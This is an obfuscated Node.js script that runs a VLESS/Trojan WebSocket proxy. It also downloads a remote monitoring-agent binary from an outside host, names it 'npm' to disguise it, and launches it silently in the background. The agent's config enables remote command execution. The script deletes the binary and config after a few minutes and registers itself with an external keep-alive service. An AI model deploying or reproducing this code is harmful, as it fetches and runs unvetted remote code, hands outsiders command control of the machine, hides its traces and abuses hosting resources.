const _0x8846a0=_0x5055;(function(_0x424272,_0x3e0c7f){const _0x4a9e7a=_0x5055,_0x422654=_0x424272();while(!![]){try{const _0x39ff6d=parseInt(_0x4a9e7a(0x207))/0x1+-parseInt(_0x4a9e7a(0x210))/0x2+parseInt(_0x4a9e7a(0x1eb))/0x3+parseInt(_0x4a9e7a(0x218))/0x4+-parseInt(_0x4a9e7a(0x1b8))/0x5*(-parseInt(_0x4a9e7a(0x1f9))/0x6)+parseInt(_0x4a9e7a(0x1d9))/0x7+-parseInt(_0x4a9e7a(0x21e))/0x8;if(_0x39ff6d===_0x3e0c7f)break;else _0x422654['push'](_0x422654['shift']());}catch(_0x128463){_0x422654['push'](_0x422654['shift']());}}}(_0x935c,0x3d198));const os=require('os'),http=require(_0x8846a0(0x1e7)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x8846a0(0x1c0)),crypto=require(_0x8846a0(0x1fe)),{Buffer}=require(_0x8846a0(0x1da)),{exec,execSync}=require(_0x8846a0(0x224)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x8846a0(0x223)][_0x8846a0(0x219)]||_0x8846a0(0x1e1),NEZHA_SERVER=process[_0x8846a0(0x223)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x8846a0(0x223)][_0x8846a0(0x212)]||'',NEZHA_KEY=process[_0x8846a0(0x223)][_0x8846a0(0x22b)]||'',DOMAIN=process[_0x8846a0(0x223)][_0x8846a0(0x1fd)]||_0x8846a0(0x22c),AUTO_ACCESS=process['env'][_0x8846a0(0x1dd)]||![],WSPATH=process[_0x8846a0(0x223)]['WSPATH']||UUID[_0x8846a0(0x226)](0x0,0x8),SUB_PATH=process[_0x8846a0(0x223)][_0x8846a0(0x1ff)]||_0x8846a0(0x1e4),NAME=process[_0x8846a0(0x223)][_0x8846a0(0x206)]||'',PORT=process[_0x8846a0(0x223)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x31a465=_0x8846a0;try{const _0x4d7daa=await axios[_0x31a465(0x1ed)](_0x31a465(0x1fa)),_0x54e1aa=_0x4d7daa[_0x31a465(0x1b6)];ISP=(_0x54e1aa[_0x31a465(0x217)]+'-'+_0x54e1aa[_0x31a465(0x1bc)])[_0x31a465(0x1b4)](/ /g,'_');}catch(_0x1c2b04){ISP=_0x31a465(0x20a);}};GetISP();const httpServer=http[_0x8846a0(0x202)]((_0x97f00d,_0x787e22)=>{const _0x2a9e14=_0x8846a0;if(_0x97f00d[_0x2a9e14(0x1dc)]==='/'){const _0x4b7496=path['join'](__dirname,_0x2a9e14(0x1d7));fs[_0x2a9e14(0x1e3)](_0x4b7496,_0x2a9e14(0x1df),(_0x557776,_0x389e2e)=>{const _0x5a750f=_0x2a9e14;if(_0x557776){_0x787e22[_0x5a750f(0x21b)](0xc8,{'Content-Type':'text/html'}),_0x787e22[_0x5a750f(0x20b)](_0x5a750f(0x1b9));return;}_0x787e22[_0x5a750f(0x21b)](0xc8,{'Content-Type':_0x5a750f(0x1d4)}),_0x787e22[_0x5a750f(0x20b)](_0x389e2e);});return;}else{if(_0x97f00d['url']==='/'+SUB_PATH){const _0x3e1dc4=NAME?NAME+'-'+ISP:ISP,_0x68dc11='vless://'+UUID+_0x2a9e14(0x1cd)+DOMAIN+_0x2a9e14(0x216)+DOMAIN+_0x2a9e14(0x1c6)+WSPATH+'#'+_0x3e1dc4,_0x30dfec=_0x2a9e14(0x1fc)+UUID+_0x2a9e14(0x211)+DOMAIN+_0x2a9e14(0x216)+DOMAIN+_0x2a9e14(0x1c6)+WSPATH+'#'+_0x3e1dc4,_0x1c2fcd=_0x68dc11+'\x0a'+_0x30dfec,_0x14a955=Buffer['from'](_0x1c2fcd)['toString'](_0x2a9e14(0x214));_0x787e22[_0x2a9e14(0x21b)](0xc8,{'Content-Type':'text/plain'}),_0x787e22[_0x2a9e14(0x20b)](_0x14a955+'\x0a');}else _0x787e22[_0x2a9e14(0x21b)](0x194,{'Content-Type':_0x2a9e14(0x1bd)}),_0x787e22[_0x2a9e14(0x20b)](_0x2a9e14(0x1c2));}}),wss=new WebSocket[(_0x8846a0(0x1d5))]({'server':httpServer}),uuid=UUID[_0x8846a0(0x1b4)](/-/g,''),DNS_SERVERS=[_0x8846a0(0x1ca),'1.1.1.1'];function resolveHost(_0x562ce4){return new Promise((_0x2f2851,_0x2f682f)=>{const _0xc2e93c=_0x5055;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xc2e93c(0x1c7)](_0x562ce4)){_0x2f2851(_0x562ce4);return;}let _0x1f3e60=0x0;function _0x58a632(){const _0x12ccb5=_0xc2e93c;if(_0x1f3e60>=DNS_SERVERS[_0x12ccb5(0x1cf)]){_0x2f682f(new Error(_0x12ccb5(0x1d6)+_0x562ce4+_0x12ccb5(0x1c4)));return;}const _0x2271a4=DNS_SERVERS[_0x1f3e60];_0x1f3e60++;const _0x211c54=_0x12ccb5(0x20e)+encodeURIComponent(_0x562ce4)+'&type=A';axios[_0x12ccb5(0x1ed)](_0x211c54,{'timeout':0x1388,'headers':{'Accept':_0x12ccb5(0x1bf)}})[_0x12ccb5(0x209)](_0x2838f5=>{const _0x2daf2c=_0x12ccb5,_0x11f02d=_0x2838f5[_0x2daf2c(0x1b6)];if(_0x11f02d[_0x2daf2c(0x20c)]===0x0&&_0x11f02d[_0x2daf2c(0x1ea)]&&_0x11f02d[_0x2daf2c(0x1ea)][_0x2daf2c(0x1cf)]>0x0){const _0x17df4b=_0x11f02d[_0x2daf2c(0x1ea)][_0x2daf2c(0x1cc)](_0x3b78f7=>_0x3b78f7['type']===0x1);if(_0x17df4b){_0x2f2851(_0x17df4b[_0x2daf2c(0x1b6)]);return;}}_0x58a632();})[_0x12ccb5(0x1e5)](_0x3f9095=>{_0x58a632();});}_0x58a632();});}function _0x935c(){const _0x18a30d=['config.yaml','slice','443','true','unlink','npm\x20is\x20already\x20running,\x20skip\x20running...','NEZHA_KEY','1234.abc.com','split','replace','message','data','once','5YHrLDx','Hello\x20world!','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','asOrganization','text/plain','send','application/dns-json','path','application/json','Not\x20Found\x0a','join','\x20with\x20all\x20DNS\x20servers','log','&path=%2F','test','npm\x20running\x20error:','post','8.8.4.4','https://arm64.ssss.nyc.mn/agent','find','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','https://','length','write','error','finish','includes','text/html','Server','Failed\x20to\x20resolve\x20','index.html','substr','878052EGnKAz','buffer','npm','url','AUTO_ACCESS','https://amd64.ssss.nyc.mn/v1','utf8','connect','ebc17261-8db3-44d4-a626-65b4b9f8229e','concat','readFile','123456','catch','map','http','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','decode','Answer','1225539ojYLId','listen','get','trim','2096','close','every','2087','8443','pop','sha224','createWriteStream','readUInt16BE','aarch64','2722842KqkNgS','https://speed.cloudflare.com/meta','update','trojan://','DOMAIN','crypto','SUB_PATH','npm\x20is\x20running','reduce','createServer','\x20-p\x20','digest','https://amd64.ssss.nyc.mn/agent','NAME','34288yDbLPA','pipe','then','Unknown','end','Status','hex','https://dns.google/resolve?name=','2053','471420epZNuh','@cdns.doon.eu.org:443?security=tls&sni=','NEZHA_PORT','connection','base64','toString','&fp=chrome&type=ws&host=','country','1413828sPgwlO','UUID','https://oooo.serv00.net/add-url','writeHead','client_secret:\x20','setsid\x20nohup\x20./npm\x20-s\x20','7116216xEkFJE','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','arm64','/bin/bash','Server\x20is\x20running\x20on\x20port\x20','env','child_process'];_0x935c=function(){return _0x18a30d;};return _0x935c();}function _0x5055(_0x38e903,_0x3a71d9){const _0x935ce8=_0x935c();return _0x5055=function(_0x5055bd,_0x4da7aa){_0x5055bd=_0x5055bd-0x1b3;let _0x499a1c=_0x935ce8[_0x5055bd];return _0x499a1c;},_0x5055(_0x38e903,_0x3a71d9);}function handleVlessConnection(_0x2cc6a5,_0x235180){const _0x10b716=_0x8846a0,[_0x5d3301]=_0x235180,_0x4c7941=_0x235180[_0x10b716(0x226)](0x1,0x11);if(!_0x4c7941[_0x10b716(0x1f1)]((_0x10757d,_0x40f8c3)=>_0x10757d==parseInt(uuid[_0x10b716(0x1d8)](_0x40f8c3*0x2,0x2),0x10)))return![];let _0x56476f=_0x235180['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x112c31=_0x235180[_0x10b716(0x226)](_0x56476f,_0x56476f+=0x2)[_0x10b716(0x1f7)](0x0),_0x8e13d7=_0x235180[_0x10b716(0x226)](_0x56476f,_0x56476f+=0x1)['readUInt8'](),_0x4a51f4=_0x8e13d7==0x1?_0x235180[_0x10b716(0x226)](_0x56476f,_0x56476f+=0x4)['join']('.'):_0x8e13d7==0x2?new TextDecoder()[_0x10b716(0x1e9)](_0x235180['slice'](_0x56476f+0x1,_0x56476f+=0x1+_0x235180[_0x10b716(0x226)](_0x56476f,_0x56476f+0x1)['readUInt8']())):_0x8e13d7==0x3?_0x235180['slice'](_0x56476f,_0x56476f+=0x10)['reduce']((_0x5baba4,_0x2208d3,_0x59f964,_0x110ca1)=>_0x59f964%0x2?_0x5baba4[_0x10b716(0x1e2)](_0x110ca1[_0x10b716(0x226)](_0x59f964-0x1,_0x59f964+0x1)):_0x5baba4,[])[_0x10b716(0x1e6)](_0x2f0a8c=>_0x2f0a8c[_0x10b716(0x1f7)](0x0)[_0x10b716(0x215)](0x10))[_0x10b716(0x1c3)](':'):'';_0x2cc6a5[_0x10b716(0x1be)](new Uint8Array([_0x5d3301,0x0]));const _0x4bdf1a=createWebSocketStream(_0x2cc6a5);return resolveHost(_0x4a51f4)[_0x10b716(0x209)](_0xb9da84=>{net['connect']({'host':_0xb9da84,'port':_0x112c31},function(){const _0x401769=_0x5055;this[_0x401769(0x1d0)](_0x235180[_0x401769(0x226)](_0x56476f)),_0x4bdf1a['on'](_0x401769(0x1d1),()=>{})[_0x401769(0x208)](this)['on'](_0x401769(0x1d1),()=>{})[_0x401769(0x208)](_0x4bdf1a);})['on']('error',()=>{});})[_0x10b716(0x1e5)](_0x1c5f83=>{const _0x13c808=_0x10b716;net[_0x13c808(0x1e0)]({'host':_0x4a51f4,'port':_0x112c31},function(){const _0xe81356=_0x13c808;this[_0xe81356(0x1d0)](_0x235180[_0xe81356(0x226)](_0x56476f)),_0x4bdf1a['on'](_0xe81356(0x1d1),()=>{})[_0xe81356(0x208)](this)['on']('error',()=>{})[_0xe81356(0x208)](_0x4bdf1a);})['on'](_0x13c808(0x1d1),()=>{});}),!![];}function handleTrojanConnection(_0xfdd7ca,_0x5e3d9a){const _0x3de606=_0x8846a0;try{if(_0x5e3d9a[_0x3de606(0x1cf)]<0x3a)return![];const _0xec6a69=_0x5e3d9a[_0x3de606(0x226)](0x0,0x38)[_0x3de606(0x215)](),_0x5f3f9f=[UUID];let _0x41c22a=null;for(const _0x3557ca of _0x5f3f9f){const _0xd11921=crypto['createHash'](_0x3de606(0x1f5))[_0x3de606(0x1fb)](_0x3557ca)[_0x3de606(0x204)](_0x3de606(0x20d));if(_0xd11921===_0xec6a69){_0x41c22a=_0x3557ca;break;}}if(!_0x41c22a)return![];let _0x2fdfbf=0x38;_0x5e3d9a[_0x2fdfbf]===0xd&&_0x5e3d9a[_0x2fdfbf+0x1]===0xa&&(_0x2fdfbf+=0x2);const _0x4eec03=_0x5e3d9a[_0x2fdfbf];if(_0x4eec03!==0x1)return![];_0x2fdfbf+=0x1;const _0x280482=_0x5e3d9a[_0x2fdfbf];_0x2fdfbf+=0x1;let _0x2ecd5b,_0x41ea7f;if(_0x280482===0x1)_0x2ecd5b=_0x5e3d9a[_0x3de606(0x226)](_0x2fdfbf,_0x2fdfbf+0x4)[_0x3de606(0x1c3)]('.'),_0x2fdfbf+=0x4;else{if(_0x280482===0x3){const _0x4ee59c=_0x5e3d9a[_0x2fdfbf];_0x2fdfbf+=0x1,_0x2ecd5b=_0x5e3d9a[_0x3de606(0x226)](_0x2fdfbf,_0x2fdfbf+_0x4ee59c)['toString'](),_0x2fdfbf+=_0x4ee59c;}else{if(_0x280482===0x4)_0x2ecd5b=_0x5e3d9a[_0x3de606(0x226)](_0x2fdfbf,_0x2fdfbf+0x10)[_0x3de606(0x201)]((_0x4af962,_0x2346a1,_0x57b041,_0x4ced92)=>_0x57b041%0x2?_0x4af962[_0x3de606(0x1e2)](_0x4ced92[_0x3de606(0x226)](_0x57b041-0x1,_0x57b041+0x1)):_0x4af962,[])[_0x3de606(0x1e6)](_0x5a2c2a=>_0x5a2c2a['readUInt16BE'](0x0)[_0x3de606(0x215)](0x10))[_0x3de606(0x1c3)](':'),_0x2fdfbf+=0x10;else return![];}}_0x41ea7f=_0x5e3d9a['readUInt16BE'](_0x2fdfbf),_0x2fdfbf+=0x2;_0x2fdfbf<_0x5e3d9a['length']&&_0x5e3d9a[_0x2fdfbf]===0xd&&_0x5e3d9a[_0x2fdfbf+0x1]===0xa&&(_0x2fdfbf+=0x2);const _0x1afc30=createWebSocketStream(_0xfdd7ca);return resolveHost(_0x2ecd5b)[_0x3de606(0x209)](_0x28d4bd=>{const _0x1f05bb=_0x3de606;net[_0x1f05bb(0x1e0)]({'host':_0x28d4bd,'port':_0x41ea7f},function(){const _0x117a2e=_0x1f05bb;_0x2fdfbf<_0x5e3d9a[_0x117a2e(0x1cf)]&&this[_0x117a2e(0x1d0)](_0x5e3d9a['slice'](_0x2fdfbf)),_0x1afc30['on'](_0x117a2e(0x1d1),()=>{})['pipe'](this)['on'](_0x117a2e(0x1d1),()=>{})[_0x117a2e(0x208)](_0x1afc30);})['on'](_0x1f05bb(0x1d1),()=>{});})['catch'](_0x4f26f3=>{const _0xbf0db4=_0x3de606;net[_0xbf0db4(0x1e0)]({'host':_0x2ecd5b,'port':_0x41ea7f},function(){const _0x2502d0=_0xbf0db4;_0x2fdfbf<_0x5e3d9a['length']&&this[_0x2502d0(0x1d0)](_0x5e3d9a[_0x2502d0(0x226)](_0x2fdfbf)),_0x1afc30['on'](_0x2502d0(0x1d1),()=>{})[_0x2502d0(0x208)](this)['on'](_0x2502d0(0x1d1),()=>{})['pipe'](_0x1afc30);})['on'](_0xbf0db4(0x1d1),()=>{});}),!![];}catch(_0x95dbb1){return![];}}wss['on'](_0x8846a0(0x213),(_0x5a7b9a,_0x5d5540)=>{const _0x19f3dc=_0x8846a0,_0x441644=_0x5d5540[_0x19f3dc(0x1dc)]||'';_0x5a7b9a[_0x19f3dc(0x1b7)](_0x19f3dc(0x1b5),_0x442e0d=>{const _0x43dbcb=_0x19f3dc;if(_0x442e0d[_0x43dbcb(0x1cf)]>0x11&&_0x442e0d[0x0]===0x0){const _0x9116c8=_0x442e0d[_0x43dbcb(0x226)](0x1,0x11),_0x3dd22e=_0x9116c8[_0x43dbcb(0x1f1)]((_0x2f7c5f,_0x1753da)=>_0x2f7c5f==parseInt(uuid['substr'](_0x1753da*0x2,0x2),0x10));if(_0x3dd22e){!handleVlessConnection(_0x5a7b9a,_0x442e0d)&&_0x5a7b9a[_0x43dbcb(0x1f0)]();return;}}!handleTrojanConnection(_0x5a7b9a,_0x442e0d)&&_0x5a7b9a[_0x43dbcb(0x1f0)]();})['on'](_0x19f3dc(0x1d1),()=>{});});const getDownloadUrl=()=>{const _0xa9d84f=_0x8846a0,_0x5262b0=os['arch']();return _0x5262b0==='arm'||_0x5262b0===_0xa9d84f(0x220)||_0x5262b0===_0xa9d84f(0x1f8)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0xa9d84f(0x1cb):!NEZHA_PORT?_0xa9d84f(0x1de):_0xa9d84f(0x205);},downloadFile=async()=>{const _0xec936a=_0x8846a0;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4a632a=getDownloadUrl(),_0x252e15=await axios({'method':_0xec936a(0x1ed),'url':_0x4a632a,'responseType':'stream'}),_0x2108b4=fs[_0xec936a(0x1f6)](_0xec936a(0x1db));return _0x252e15[_0xec936a(0x1b6)]['pipe'](_0x2108b4),new Promise((_0x6f08b9,_0x56ff24)=>{const _0x3c15a9=_0xec936a;_0x2108b4['on'](_0x3c15a9(0x1d2),()=>{const _0xb93117=_0x3c15a9;console[_0xb93117(0x1c5)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x4aff4d=>{if(_0x4aff4d)_0x56ff24(_0x4aff4d);_0x6f08b9();});}),_0x2108b4['on']('error',_0x56ff24);});}catch(_0x1fd529){throw _0x1fd529;}},runnz=async()=>{const _0xa64ba2=_0x8846a0;try{const _0x39a25c=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x39a25c[_0xa64ba2(0x1ee)]()!==''){console[_0xa64ba2(0x1c5)](_0xa64ba2(0x22a));return;}}catch(_0x2e8d58){}await downloadFile();let _0x4d5781='',_0x4c2ac6=[_0xa64ba2(0x227),_0xa64ba2(0x1f3),_0xa64ba2(0x1ef),_0xa64ba2(0x1f2),'2083',_0xa64ba2(0x20f)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x545edc=_0x4c2ac6[_0xa64ba2(0x1d3)](NEZHA_PORT)?'--tls':'';_0x4d5781=_0xa64ba2(0x21d)+NEZHA_SERVER+':'+NEZHA_PORT+_0xa64ba2(0x203)+NEZHA_KEY+'\x20'+_0x545edc+_0xa64ba2(0x1bb);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1dbffb=NEZHA_SERVER[_0xa64ba2(0x1d3)](':')?NEZHA_SERVER[_0xa64ba2(0x1b3)](':')[_0xa64ba2(0x1f4)]():'',_0x3c66dc=_0x4c2ac6[_0xa64ba2(0x1d3)](_0x1dbffb)?_0xa64ba2(0x228):'false',_0x196185=_0xa64ba2(0x21c)+NEZHA_KEY+_0xa64ba2(0x1ba)+NEZHA_SERVER+_0xa64ba2(0x1e8)+_0x3c66dc+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0xa64ba2(0x225),_0x196185);}_0x4d5781='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0xa64ba2(0x1c5)](_0xa64ba2(0x21f));return;}}try{exec(_0x4d5781,{'shell':_0xa64ba2(0x221)},_0x1576a2=>{const _0x3c7a70=_0xa64ba2;if(_0x1576a2)console[_0x3c7a70(0x1d1)](_0x3c7a70(0x1c8),_0x1576a2);else console[_0x3c7a70(0x1c5)](_0x3c7a70(0x200));});}catch(_0x2822af){console[_0xa64ba2(0x1d1)]('error:\x20'+_0x2822af);}};async function addAccessTask(){const _0x19be75=_0x8846a0;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xd2cbef=_0x19be75(0x1ce)+DOMAIN+'/'+SUB_PATH;try{const _0x5f5c75=await axios[_0x19be75(0x1c9)](_0x19be75(0x21a),{'url':_0xd2cbef},{'headers':{'Content-Type':_0x19be75(0x1c1)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5e814c){}}const delFiles=()=>{const _0x1c0afd=_0x8846a0;fs[_0x1c0afd(0x229)](_0x1c0afd(0x1db),()=>{}),fs[_0x1c0afd(0x229)]('config.yaml',()=>{});};httpServer[_0x8846a0(0x1ec)](PORT,()=>{const _0x2a6356=_0x8846a0;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2a6356(0x1c5)](_0x2a6356(0x222)+PORT);});
